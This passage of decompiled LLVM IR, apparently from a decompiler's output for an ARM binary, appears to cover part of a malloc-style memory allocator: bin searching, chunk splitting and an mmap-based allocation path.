  %v2_11bd0 = icmp ult i32 %v0_11bd8, 2
  %v1_11bd0. = select i1 %v2_11bd0, i32 %v1_11bd0, i32 0
  store i32 %v1_11bd0., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_11bd8, %v1_11bd8
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_11bd0
  %v5_11bdc = or i32 %v1_11bd0., 1
  store i32 %v5_11bdc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11be8.preheader

bb142:                                            ; preds = %dec_label_pc_11bd0
  %v2_11be0 = icmp eq i32 %v1_11bd0., 0
  br i1 %v2_11be0, label %.dec_label_pc_11c24.preheader_crit_edge, label %dec_label_pc_11be8.preheader

.dec_label_pc_11c24.preheader_crit_edge:          ; preds = %bb142
  %v0_11c1c54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c24.preheader

dec_label_pc_11be8.preheader:                     ; preds = %bb142, %.thread12
  %v0_11be8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11be8.preheader, %dec_label_pc_11bf4
  %v0_11be8 = phi i32 [ %v0_11be8.pre, %dec_label_pc_11be8.preheader ], [ %v1_11be8, %dec_label_pc_11bf4 ]
  %v1_11be8 = add i32 %v0_11be8, 1
  store i32 %v1_11be8, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_11be8, 2
  br i1 %tmp208, label %dec_label_pc_11cc8.loopexit, label %dec_label_pc_11bf4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be8
  store i32 124820, i32* %r3.global-to-local, align 4
  %v1_11bf8 = load i32, i32* @r8, align 4
  %v2_11bf8 = add i32 %v1_11bf8, 124820
  %v3_11bf8 = inttoptr i32 %v2_11bf8 to i32*
  %v4_11bf8 = load i32, i32* %v3_11bf8, align 4
  store i32 %v4_11bf8, i32* %r2.global-to-local, align 4
  %v4_11bfc = mul i32 %v1_11be8, 4
  %v5_11bfc = add i32 %v4_11bf8, %v4_11bfc
  store i32 %v5_11bfc, i32* %r3.global-to-local, align 4
  %v1_11c00 = add i32 %v5_11bfc, 820
  %v2_11c00 = inttoptr i32 %v1_11c00 to i32*
  %v3_11c00 = load i32, i32* %v2_11c00, align 4
  store i32 %v3_11c00, i32* @r4, align 4
  %v2_11c04 = icmp eq i32 %v3_11c00, 0
  br i1 %v2_11c04, label %dec_label_pc_11be8, label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11bf4
  %v4_11c0c = mul i32 %v1_11be8, 256
  %v5_11c0c = add i32 %v4_11bf8, %v4_11c0c
  store i32 %v5_11c0c, i32* %r3.global-to-local, align 4
  %v1_11c10 = add i32 %v5_11c0c, 44
  store i32 %v1_11c10, i32* %r0.global-to-local, align 4
  %v0_11c14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11c14, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c24.preheader

dec_label_pc_11c24.preheader:                     ; preds = %.dec_label_pc_11c24.preheader_crit_edge, %dec_label_pc_11c0c
  %v0_11c1c54 = phi i32 [ %v1_11c10, %dec_label_pc_11c0c ], [ %v0_11c1c54.pre, %.dec_label_pc_11c24.preheader_crit_edge ]
  %v0_11c40 = phi i32 [ %v3_11c00, %dec_label_pc_11c0c ], [ %v1_11bd8, %.dec_label_pc_11c24.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_11c14, %dec_label_pc_11c0c ], [ %v0_11bd8, %.dec_label_pc_11c24.preheader_crit_edge ]
  %v2_11c2451 = and i32 %ip.promoted, %v0_11c40
  %v4_11c2453 = icmp eq i32 %v2_11c2451, 0
  br i1 %v4_11c2453, label %dec_label_pc_11c1c, label %dec_label_pc_11c2c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c24.preheader, %dec_label_pc_11c1c
  %v2_11c2056 = phi i32 [ %v2_11c20, %dec_label_pc_11c1c ], [ %ip.promoted, %dec_label_pc_11c24.preheader ]
  %v0_11c1c55 = phi i32 [ %v1_11c1c, %dec_label_pc_11c1c ], [ %v0_11c1c54, %dec_label_pc_11c24.preheader ]
  %v1_11c1c = add i32 %v0_11c1c55, 8
  %v2_11c20 = mul i32 %v2_11c2056, 2
  %v2_11c24 = and i32 %v2_11c20, %v0_11c40
  %v4_11c24 = icmp eq i32 %v2_11c24, 0
  br i1 %v4_11c24, label %dec_label_pc_11c1c, label %dec_label_pc_11c24.dec_label_pc_11c2c_crit_edge

dec_label_pc_11c24.dec_label_pc_11c2c_crit_edge:  ; preds = %dec_label_pc_11c1c
  store i32 %v1_11c1c, i32* %r0.global-to-local, align 4
  store i32 %v2_11c20, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c24.dec_label_pc_11c2c_crit_edge, %dec_label_pc_11c24.preheader
  %v0_11c4c = phi i32 [ %v2_11c20, %dec_label_pc_11c24.dec_label_pc_11c2c_crit_edge ], [ %ip.promoted, %dec_label_pc_11c24.preheader ]
  %v0_11c70 = phi i32 [ %v1_11c1c, %dec_label_pc_11c24.dec_label_pc_11c2c_crit_edge ], [ %v0_11c1c54, %dec_label_pc_11c24.preheader ]
  %v1_11c2c = add i32 %v0_11c70, 12
  %v2_11c2c = inttoptr i32 %v1_11c2c to i32*
  %v3_11c2c = load i32, i32* %v2_11c2c, align 4
  store i32 %v3_11c2c, i32* @lr, align 4
  %v9_11c30 = icmp eq i32 %v3_11c2c, %v0_11c70
  br i1 %v9_11c30, label %dec_label_pc_11c38, label %dec_label_pc_11c58

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c2c
  store i32 124820, i32* %r0.global-to-local, align 4
  %v1_11c3c = load i32, i32* @r8, align 4
  %v2_11c3c = add i32 %v1_11c3c, 124820
  %v3_11c3c = inttoptr i32 %v2_11c3c to i32*
  %v4_11c3c = load i32, i32* %v3_11c3c, align 4
  %v2_11c40 = sub i32 -1, %v0_11c4c
  %v3_11c40 = and i32 %v0_11c40, %v2_11c40
  store i32 %v3_11c40, i32* @r4, align 4
  %v1_11c44 = load i32, i32* @r5, align 4
  %v4_11c44 = mul i32 %v1_11c44, 4
  %v5_11c44 = add i32 %v4_11c44, %v4_11c3c
  store i32 %v5_11c44, i32* %r3.global-to-local, align 4
  %v1_11c48 = add i32 %v0_11c70, 8
  store i32 %v1_11c48, i32* %r0.global-to-local, align 4
  %v2_11c4c = mul i32 %v0_11c4c, 2
  store i32 %v2_11c4c, i32* %ip.global-to-local, align 4
  %v2_11c50 = add i32 %v5_11c44, 820
  %v3_11c50 = inttoptr i32 %v2_11c50 to i32*
  store i32 %v3_11c40, i32* %v3_11c50, align 4
  %v0_11bd0.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_11bd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11bd0

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11c2c
  %v1_11c58 = add i32 %v3_11c2c, 4
  %v2_11c58 = inttoptr i32 %v1_11c58 to i32*
  %v3_11c58 = load i32, i32* %v2_11c58, align 4
  store i32 %v3_11c58, i32* %r3.global-to-local, align 4
  %v1_11c5c = and i32 %v3_11c58, -4
  store i32 %v1_11c5c, i32* %r2.global-to-local, align 4
  %v0_11c60 = load i32, i32* @sl, align 4
  %v2_11c60 = sub i32 %v1_11c5c, %v0_11c60
  store i32 %v2_11c60, i32* %ip.global-to-local, align 4
  %v1_11c64 = add i32 %v3_11c2c, 12
  %v2_11c64 = inttoptr i32 %v1_11c64 to i32*
  %v3_11c64 = load i32, i32* %v2_11c64, align 4
  store i32 %v3_11c64, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_11c60, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_11c58
  %v6_11c6c = add i32 %v1_11c5c, %v3_11c2c
  store i32 %v6_11c6c, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_11c58, %bb143
  %v2_11c70 = add i32 %v3_11c64, 8
  %v3_11c70 = inttoptr i32 %v2_11c70 to i32*
  store i32 %v0_11c70, i32* %v3_11c70, align 4
  %v0_11c74 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c74 = load i32, i32* %r0.global-to-local, align 4
  %v2_11c74 = add i32 %v1_11c74, 12
  %v3_11c74 = inttoptr i32 %v2_11c74 to i32*
  store i32 %v0_11c74, i32* %v3_11c74, align 4
  %v4_11c78 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_11b54_crit_edge, label %dec_label_pc_11c84

.dec_label_pc_11b54_crit_edge:                    ; preds = %bb144
  %v5_11c78 = add i32 %v4_11c78, 8
  store i32 %v5_11c78, i32* %r4.global-to-local, align 4
  %v4_11c7c = load i32, i32* %r2.global-to-local, align 4
  %v5_11c7c = add i32 %v4_11c7c, 4
  %v6_11c7c = inttoptr i32 %v5_11c7c to i32*
  %v7_11c7c = load i32, i32* %v6_11c7c, align 4
  store i32 %v7_11c7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11b54

dec_label_pc_11c84:                               ; preds = %bb144
  %v1_11c84 = load i32, i32* @sl, align 4
  %v2_11c84 = add i32 %v1_11c84, %v4_11c78
  store i32 %v2_11c84, i32* %r1.global-to-local, align 4
  %v1_11c8c = load i32, i32* @r6, align 4
  %v2_11c8c = add i32 %v1_11c8c, 8
  %v3_11c8c = inttoptr i32 %v2_11c8c to i32*
  store i32 %v2_11c84, i32* %v3_11c8c, align 4
  %v0_11c90 = load i32, i32* %r1.global-to-local, align 4
  %v1_11c90 = load i32, i32* @r6, align 4
  %v2_11c90 = add i32 %v1_11c90, 12
  %v3_11c90 = inttoptr i32 %v2_11c90 to i32*
  store i32 %v0_11c90, i32* %v3_11c90, align 4
  %v0_11c94 = load i32, i32* @r6, align 4
  %v1_11c94 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c94 = add i32 %v1_11c94, 8
  %v3_11c94 = inttoptr i32 %v2_11c94 to i32*
  store i32 %v0_11c94, i32* %v3_11c94, align 4
  %v0_11c98 = load i32, i32* @r6, align 4
  %v1_11c98 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c98 = add i32 %v1_11c98, 12
  %v3_11c98 = inttoptr i32 %v2_11c98 to i32*
  store i32 %v0_11c98, i32* %v3_11c98, align 4
  %tmp210 = icmp ult i32 %v1_11c84, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_11c84
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r2.global-to-local, align 4
  %v8_11ca4 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v8_11ca4, i32* %r3.global-to-local, align 4
  %v4_11ca8 = load i32, i32* %r1.global-to-local, align 4
  %v6_11ca8 = add i32 %v8_11ca4, 48
  %v7_11ca8 = inttoptr i32 %v6_11ca8 to i32*
  store i32 %v4_11ca8, i32* %v7_11ca8, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11c84, %bb145
  %v0_11cac = load i32, i32* @sl, align 4
  %v1_11cac = or i32 %v0_11cac, 1
  store i32 %v1_11cac, i32* %r2.global-to-local, align 4
  %v0_11cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11cb0 = or i32 %v0_11cb0, 1
  store i32 %v1_11cb0, i32* %r3.global-to-local, align 4
  %v0_11cb4 = load i32, i32* @lr, align 4
  %v1_11cb4 = add i32 %v0_11cb4, 8
  store i32 %v1_11cb4, i32* %r4.global-to-local, align 4
  %v2_11cb8 = add i32 %v0_11cb4, 4
  %v3_11cb8 = inttoptr i32 %v2_11cb8 to i32*
  store i32 %v1_11cac, i32* %v3_11cb8, align 4
  %v0_11cbc = load i32, i32* %ip.global-to-local, align 4
  %v1_11cbc = load i32, i32* %r1.global-to-local, align 4
  %v3_11cbc = add i32 %v1_11cbc, %v0_11cbc
  %v4_11cbc = inttoptr i32 %v3_11cbc to i32*
  store i32 %v0_11cbc, i32* %v4_11cbc, align 4
  %v0_11cc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11cc0 = add i32 %v1_11cc0, 4
  %v3_11cc0 = inttoptr i32 %v2_11cc0 to i32*
  store i32 %v0_11cc0, i32* %v3_11cc0, align 4
  br label %dec_label_pc_12114

dec_label_pc_11cc8.loopexit:                      ; preds = %dec_label_pc_11be8
  br label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cc8.loopexit, %dec_label_pc_118dc, %dec_label_pc_118e4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %ip.global-to-local, align 4
  %v4_11cd0 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11cd0, i32* @r0, align 4
  %v1_11cd4 = add i32 %v4_11cd0, 44
  %v2_11cd4 = inttoptr i32 %v1_11cd4 to i32*
  %v3_11cd4 = load i32, i32* %v2_11cd4, align 4
  store i32 %v3_11cd4, i32* %ip.global-to-local, align 4
  %v1_11cd8 = add i32 %v3_11cd4, 4
  %v2_11cd8 = inttoptr i32 %v1_11cd8 to i32*
  %v3_11cd8 = load i32, i32* %v2_11cd8, align 4
  %v0_11cdc = load i32, i32* @sl, align 4
  %v1_11cdc = add i32 %v0_11cdc, 16
  store i32 %v1_11cdc, i32* %r1.global-to-local, align 4
  %v1_11ce0 = and i32 %v3_11cd8, -4
  store i32 %v1_11ce0, i32* %r3.global-to-local, align 4
  %v3_11ce4 = icmp ult i32 %v1_11ce0, %v1_11cdc
  br i1 %v3_11ce4, label %dec_label_pc_11d14, label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11cc8
  %v2_11cf0 = sub i32 %v1_11ce0, %v0_11cdc
  %v2_11cf4 = add i32 %v0_11cdc, %v3_11cd4
  store i32 %v2_11cf4, i32* %r1.global-to-local, align 4
  %v1_11cf8 = or i32 %v2_11cf0, 1
  store i32 %v1_11cf8, i32* %r3.global-to-local, align 4
  %v1_11cfc = or i32 %v0_11cdc, 1
  store i32 %v1_11cfc, i32* %r2.global-to-local, align 4
  %v1_11d00 = add i32 %v3_11cd4, 8
  store i32 %v1_11d00, i32* %r4.global-to-local, align 4
  store i32 %v1_11cfc, i32* %v2_11cd8, align 4
  %v0_11d08 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d08 = load i32, i32* @r0, align 4
  %v2_11d08 = add i32 %v1_11d08, 44
  %v3_11d08 = inttoptr i32 %v2_11d08 to i32*
  store i32 %v0_11d08, i32* %v3_11d08, align 4
  %v0_11d0c = load i32, i32* %r3.global-to-local, align 4
  %v1_11d0c = load i32, i32* %r1.global-to-local, align 4
  %v2_11d0c = add i32 %v1_11d0c, 4
  %v3_11d0c = inttoptr i32 %v2_11d0c to i32*
  store i32 %v0_11d0c, i32* %v3_11d0c, align 4
  br label %dec_label_pc_12114

dec_label_pc_11d14:                               ; preds = %dec_label_pc_11cc8
  %v1_11d14 = inttoptr i32 %v4_11cd0 to i32*
  %v2_11d14 = load i32, i32* %v1_11d14, align 4
  store i32 %v2_11d14, i32* %r3.global-to-local, align 4
  %v1_11d18 = and i32 %v2_11d14, 2
  store i32 %v1_11d18, i32* %ip.global-to-local, align 4
  %v2_11d18 = icmp eq i32 %v1_11d18, 0
  %v1_11d1c = add i32 %v4_11cd0, 860
  %v2_11d1c = inttoptr i32 %v1_11d1c to i32*
  %v3_11d1c = load i32, i32* %v2_11d1c, align 4
  store i32 %v3_11d1c, i32* %r1.global-to-local, align 4
  br i1 %v2_11d18, label %dec_label_pc_11d34, label %dec_label_pc_11d24

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d14
  %v0_11d24 = call i32 @function_126f4()
  %v0_11d28 = load i32, i32* @sl, align 4
  %v1_11d28 = add i32 %v0_11d28, -7
  store i32 %v1_11d28, i32* @r0, align 4
  %v0_11d2c = call i32 @function_1183c()
  store i32 %v0_11d2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12110

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d14
  %v1_11d34 = add i32 %v4_11cd0, 844
  %v2_11d34 = inttoptr i32 %v1_11d34 to i32*
  %v3_11d34 = load i32, i32* %v2_11d34, align 4
  store i32 %v3_11d34, i32* %r3.global-to-local, align 4
  %v3_11d38 = icmp ult i32 %v0_11cdc, %v3_11d34
  %v1_11d3c = add i32 %v3_11d1c, -1
  store i32 %v1_11d3c, i32* %sb.global-to-local, align 4
  br i1 %v3_11d38, label %dec_label_pc_11e10, label %dec_label_pc_11d44

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d34
  %v1_11d44 = add i32 %v4_11cd0, 852
  %v2_11d44 = inttoptr i32 %v1_11d44 to i32*
  %v3_11d44 = load i32, i32* %v2_11d44, align 4
  store i32 %v3_11d44, i32* %r2.global-to-local, align 4
  %v1_11d48 = add i32 %v4_11cd0, 848
  %v2_11d48 = inttoptr i32 %v1_11d48 to i32*
  %v3_11d48 = load i32, i32* %v2_11d48, align 4
  store i32 %v3_11d48, i32* %r3.global-to-local, align 4
  %v6_11d50 = icmp slt i32 %v3_11d48, %v3_11d44
  br i1 %v6_11d50, label %dec_label_pc_11d54, label %dec_label_pc_11e10

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d44
  %v1_11d54 = add i32 %v0_11cdc, 10
  %v2_11d58 = add i32 %v1_11d54, %v3_11d1c
  store i32 %v2_11d58, i32* %r3.global-to-local, align 4
  %v2_11d5c = sub i32 0, %v3_11d1c
  %v3_11d5c = and i32 %v2_11d58, %v2_11d5c
  store i32 %v3_11d5c, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_11d5c, %v0_11cdc
  br i1 %tmp211, label %dec_label_pc_11d68, label %dec_label_pc_11e10

dec_label_pc_11d68:                               ; preds = %dec_label_pc_11d54
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11d5c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11d80 = call i32 @function_13b24(i32 0, i32 %v3_11d5c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11d80, i32* %r0.global-to-local, align 4
  %v7_11d84 = icmp eq i32 %v6_11d80, -1
  br i1 %v7_11d84, label %dec_label_pc_11d68.dec_label_pc_11e10_crit_edge, label %dec_label_pc_11d8c

dec_label_pc_11d68.dec_label_pc_11e10_crit_edge:  ; preds = %dec_label_pc_11d68
  %v1_11e34.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11e10

dec_label_pc_11d8c:                               ; preds = %dec_label_pc_11d68
  %v1_11d8c = urem i32 %v6_11d80, 8
  store i32 %v1_11d8c, i32* %r2.global-to-local, align 4
  %v2_11d8c = icmp eq i32 %v1_11d8c, 0
  br i1 %v2_11d8c, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11d8c
  %v2_11d90 = sub nsw i32 8, %v1_11d8c
  store i32 %v2_11d90, i32* %r3.global-to-local, align 4
  %v2_11d94 = load i32, i32* @r4, align 4
  %v3_11d94 = sub i32 %v2_11d94, %v2_11d90
  %v3_11d98 = add i32 %v2_11d90, %v6_11d80
  store i32 %v3_11d98, i32* %lr.global-to-local, align 4
  %v2_11da0 = or i32 %v3_11d94, 2
  store i32 %v2_11da0, i32* %r2.global-to-local, align 4
  %v5_11da8 = inttoptr i32 %v3_11d98 to i32*
  store i32 %v2_11d90, i32* %v5_11da8, align 4
  %v1_11dac = load i32, i32* %r2.global-to-local, align 4
  %v2_11dac = load i32, i32* %lr.global-to-local, align 4
  %v3_11dac = add i32 %v2_11dac, 4
  %v4_11dac = inttoptr i32 %v3_11dac to i32*
  store i32 %v1_11dac, i32* %v4_11dac, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_11d8c
  store i32 %v6_11d80, i32* %lr.global-to-local, align 4
  %v1_11da447 = load i32, i32* @r4, align 4
  %v2_11da448 = or i32 %v1_11da447, 2
  store i32 %v2_11da448, i32* %r3.global-to-local, align 4
  %v3_11db0 = inttoptr i32 %v6_11d80 to i32*
  store i32 0, i32* %v3_11db0, align 4
  %v1_11db4 = load i32, i32* %r3.global-to-local, align 4
  %v2_11db4 = load i32, i32* %lr.global-to-local, align 4
  %v3_11db4 = add i32 %v2_11db4, 4
  %v4_11db4 = inttoptr i32 %v3_11db4 to i32*
  store i32 %v1_11db4, i32* %v4_11db4, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 124820, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11dc0 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11dc0, i32* %ip.global-to-local, align 4
  %v1_11dc4 = add i32 %v4_11dc0, 848
  %v2_11dc4 = inttoptr i32 %v1_11dc4 to i32*
  %v3_11dc4 = load i32, i32* %v2_11dc4, align 4
  store i32 %v3_11dc4, i32* %r3.global-to-local, align 4
  %v1_11dc8 = add i32 %v4_11dc0, 856
  %v2_11dc8 = inttoptr i32 %v1_11dc8 to i32*
  %v3_11dc8 = load i32, i32* %v2_11dc8, align 4
  store i32 %v3_11dc8, i32* %r2.global-to-local, align 4
  %v1_11dcc = add i32 %v3_11dc4, 1
  store i32 %v1_11dcc, i32* %r3.global-to-local, align 4
  %v7_11dd4 = icmp sgt i32 %v1_11dcc, %v3_11dc8
  br i1 %v7_11dd4, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_11dcc, i32* %v2_11dc8, align 4
  %v0_11dd8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11dd8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_11dd8 = phi i32 [ %v4_11dc0, %.thread27 ], [ %v1_11dd8.pre, %bb147 ]
  %v0_11dd8 = phi i32 [ %v1_11dcc, %.thread27 ], [ %v0_11dd8.pre, %bb147 ]
  %v2_11dd8 = add i32 %v1_11dd8, 848
  %v3_11dd8 = inttoptr i32 %v2_11dd8 to i32*
  store i32 %v0_11dd8, i32* %v3_11dd8, align 4
  %v0_11ddc = load i32, i32* %ip.global-to-local, align 4
  %v1_11ddc = add i32 %v0_11ddc, 868
  %v2_11ddc = inttoptr i32 %v1_11ddc to i32*
  %v3_11ddc = load i32, i32* %v2_11ddc, align 4
  store i32 %v3_11ddc, i32* %r3.global-to-local, align 4
  %v1_11de0 = add i32 %v0_11ddc, 880
  %v2_11de0 = inttoptr i32 %v1_11de0 to i32*
  %v3_11de0 = load i32, i32* %v2_11de0, align 4
  store i32 %v3_11de0, i32* %r2.global-to-local, align 4
  %v0_11de4 = load i32, i32* @r4, align 4
  %v2_11de4 = add i32 %v0_11de4, %v3_11ddc
  store i32 %v2_11de4, i32* %r1.global-to-local, align 4
  %v1_11de8 = add i32 %v0_11ddc, 872
  %v2_11de8 = inttoptr i32 %v1_11de8 to i32*
  %v3_11de8 = load i32, i32* %v2_11de8, align 4
  store i32 %v3_11de8, i32* %r3.global-to-local, align 4
  %v1_11df0 = add i32 %v0_11ddc, 884
  %v2_11df0 = inttoptr i32 %v1_11df0 to i32*
  %v3_11df0 = load i32, i32* %v2_11df0, align 4
  store i32 %v3_11df0, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_11de4, %v3_11de0
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_11de4, i32* %v2_11de0, align 4
  %v0_11df8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11df8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_11df8 = phi i32 [ %v0_11ddc, %bb148 ], [ %v1_11df8.pre, %bb149 ]
  %v0_11df8 = phi i32 [ %v2_11de4, %bb148 ], [ %v0_11df8.pre, %bb149 ]
  %v2_11df8 = add i32 %v1_11df8, 868
  %v3_11df8 = inttoptr i32 %v2_11df8 to i32*
  store i32 %v0_11df8, i32* %v3_11df8, align 4
  %v0_11dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_11dfc = load i32, i32* %r3.global-to-local, align 4
  %v2_11dfc = add i32 %v1_11dfc, %v0_11dfc
  store i32 %v2_11dfc, i32* %r1.global-to-local, align 4
  %v1_11e00 = load i32, i32* %r2.global-to-local, align 4
  %v0_11e04 = load i32, i32* %lr.global-to-local, align 4
  %v1_11e04 = add i32 %v0_11e04, 8
  store i32 %v1_11e04, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_11dfc, %v1_11e00
  br i1 %tmp213, label %bb151, label %dec_label_pc_12110

bb151:                                            ; preds = %bb150
  %v5_11e08 = load i32, i32* %ip.global-to-local, align 4
  %v6_11e08 = add i32 %v5_11e08, 884
  %v7_11e08 = inttoptr i32 %v6_11e08 to i32*
  store i32 %v2_11dfc, i32* %v7_11e08, align 4
  br label %dec_label_pc_12110

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11d54, %dec_label_pc_11d34, %dec_label_pc_11d68.dec_label_pc_11e10_crit_edge, %dec_label_pc_11d44
  %v1_11e34 = phi i32 [ %v1_11e34.pre, %dec_label_pc_11d68.dec_label_pc_11e10_crit_edge ], [ %v0_11cdc, %dec_label_pc_11d44 ], [ %v0_11cdc, %dec_label_pc_11d34 ], [ %v0_11cdc, %dec_label_pc_11d54 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %ip.global-to-local, align 4
  %v4_11e18 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11e18, i32* %r3.global-to-local, align 4
  %v1_11e1c = add i32 %v4_11e18, 44
  %v2_11e1c = inttoptr i32 %v1_11e1c to i32*
  %v3_11e1c = load i32, i32* %v2_11e1c, align 4
  store i32 %v3_11e1c, i32* %r0.global-to-local, align 4
  %v1_11e20 = add i32 %v4_11e18, 864
  %v2_11e20 = inttoptr i32 %v1_11e20 to i32*
  %v3_11e20 = load i32, i32* %v2_11e20, align 4
  store i32 %v3_11e20, i32* %r2.global-to-local, align 4
  %v1_11e24 = add i32 %v4_11e18, 840
  %v2_11e24 = inttoptr i32 %v1_11e24 to i32*
  %v3_11e24 = load i32, i32* %v2_11e24, align 4
  store i32 %v3_11e24, i32* %r3.global-to-local, align 4
  %v1_11e28 = add i32 %v3_11e1c, 4
  %v2_11e28 = inttoptr i32 %v1_11e28 to i32*
  %v3_11e28 = load i32, i32* %v2_11e28, align 4
  store i32 %v3_11e28, i32* %r1.global-to-local, align 4
  %v1_11e30 = urem i32 %v3_11e20, 2
  %v2_11e30 = icmp eq i32 %v1_11e30, 0
  %v1_11e2c = add i32 %v1_11e34, 16
  %v2_11e34 = add i32 %v1_11e2c, %v3_11e24
  store i32 %v2_11e34, i32* %r3.global-to-local, align 4
  %v1_11e38 = and i32 %v3_11e28, -4
  store i32 %v1_11e38, i32* @r8, align 4
  br i1 %v2_11e30, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_11e10
  %v3_11e3c = sub i32 %v2_11e34, %v1_11e38
  store i32 %v3_11e3c, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_11e10, %bb152
  %v0_11e40 = phi i32 [ %v2_11e34, %dec_label_pc_11e10 ], [ %v3_11e3c, %bb152 ]
  %v1_11e40 = load i32, i32* %sb.global-to-local, align 4
  %v2_11e40 = add i32 %v1_11e40, %v0_11e40
  store i32 %v2_11e40, i32* %r3.global-to-local, align 4
  %v1_11e44 = sub i32 -1, %v1_11e40
  store i32 %v1_11e44, i32* %fp.global-to-local, align 4
  %v2_11e48 = and i32 %v2_11e40, %v1_11e44
  store i32 %v2_11e48, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_11e48, 1
  br i1 %tmp154, label %dec_label_pc_11e6c, label %dec_label_pc_11e58

dec_label_pc_11e58:                               ; preds = %bb153
  store i32 %v2_11e48, i32* %r0.global-to-local, align 4
  %v1_11e5c = call i32 @function_13db0(i32 %v2_11e48)
  store i32 %v1_11e5c, i32* %r0.global-to-local, align 4
  %v3_11e60 = icmp eq i32 %v1_11e5c, -1
  store i32 %v1_11e5c, i32* @r4, align 4
  br i1 %v3_11e60, label %dec_label_pc_11e6c, label %dec_label_pc_11ed8

dec_label_pc_11e6c:                               ; preds = %dec_label_pc_11e58, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r1.global-to-local, align 4
  %v4_11e74 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11e74, i32* %r6.global-to-local, align 4
  %v1_11e78 = add i32 %v4_11e74, 864
  %v2_11e78 = inttoptr i32 %v1_11e78 to i32*
  %v3_11e78 = load i32, i32* %v2_11e78, align 4
  store i32 %v3_11e78, i32* %r3.global-to-local, align 4
  %v1_11e7c = urem i32 %v3_11e78, 2
  %v2_11e7c = icmp eq i32 %v1_11e7c, 0
  br i1 %v2_11e7c, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_11e6c
  %v1_11e80 = load i32, i32* @r8, align 4
  %v2_11e80 = load i32, i32* %sb.global-to-local, align 4
  %v3_11e80 = add i32 %v2_11e80, %v1_11e80
  %v2_11e84 = load i32, i32* @r5, align 4
  %v3_11e84 = add i32 %v3_11e80, %v2_11e84
  store i32 %v3_11e84, i32* %r3.global-to-local, align 4
  %v2_11e88 = load i32, i32* %fp.global-to-local, align 4
